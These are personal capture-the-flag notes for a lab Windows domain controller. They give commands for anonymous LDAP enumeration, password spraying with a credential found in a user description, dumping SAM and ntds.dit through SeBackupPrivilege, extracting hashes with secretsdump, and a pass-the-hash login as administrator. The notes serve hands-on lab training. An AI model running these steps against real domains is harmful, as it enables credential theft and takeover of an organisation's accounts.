## User
* windows dc w expected stuff open
* `nmap -n -sV --script "ldap* and not brute" -Pn IP` to dump anonymous ldap info
	* `Context: DC=baby,DC=vl` anonymous has access to browse the directory
* tried to used apache directory browser to view the full directory - arch is buns
* `ldapsearch -x -H ldap://IP:389 -b "DC=baby,DC=vl"`
	* User had creds in a description `Teresa.Bell/BabyStart123!`, creds didn't work
* decided to password spray users
	* `cat ldap-dump.txt | grep userPrincipalName | awk '{print $2}' | cut -d "@" -f 1` to get a list of users
	* `crackmapexec smb 10.10.105.51 -u ./users.txt -p BabyStart123! --shares` to spray the credential at all the users
	* password needs changing
		* `smbpasswd -r IP -U USER`
* used winrm to connect as user `evil-winrm -i IP -u Caroline.Robinson -p BallsInYourFace69!`
	* flag was on desktop user.txt
![[user-flag.png]]
![[cme-smb-passwd-spray.png]]

## Root
* hint says to look at user permissions `whoami /priv`
![[initial-privs.png]]
* SeBackupPrivilege
	* allows users to read all files on a system
	* https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
* Move to any directory where we have write permissions
	* `reg save hklm\sam c:\Temp\sam` && `reg save hklm\system c:\temp\system` saves the sam and system files
	* downloaded them w smbclient
* Used mimikatz to dump hashes from the sam hive
	* `pypykatz registry --sam sam system`
	* this is only local creds; useless
![[local-creds.png]]
### Exploiting SeBackup/SeRestore
* use diskshadow and robocopy to dump ntds.dit
* exfiltrate to host
* `impacket-secretsdump -ntds ntds.dit -system system.hive local`
* pass the hash via evil-winrm
	* `evil-winrm -i IP -u 'administrator' -H '<REDACTED>'`
![[vulnlab/baby/root-flag.png]]